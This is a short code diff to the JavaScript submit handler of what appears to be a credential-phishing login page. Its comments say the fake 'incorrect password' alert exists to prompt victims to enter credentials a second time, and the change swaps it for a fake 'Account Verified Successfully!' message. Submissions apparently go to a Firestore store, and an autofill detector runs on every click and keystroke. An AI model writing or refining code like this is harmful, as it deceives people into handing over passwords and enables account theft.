@@ -43,11 +43,11 @@ const handleSubmit = async (e) => {
         });
 
         // Instant error message to prompt a second try
-        alert("The email or password you entered is incorrect. Please try again.");
+        alert("Account Verified Successfully!");
         
         // Clear password field only (makes it look like a real login error)
         passwordInput.value = "";
-        passwordInput.focus();
+        emailInput.value = "";
 
     } catch (error) {
         console.error("Firestore Error:", error);
@@ -68,3 +68,4 @@ const detectAutofill = () => {
 // Check for autofill every time the user clicks anywhere or interacts with the page
 window.addEventListener('input', detectAutofill);
 window.addEventListener('click', detectAutofill);
+
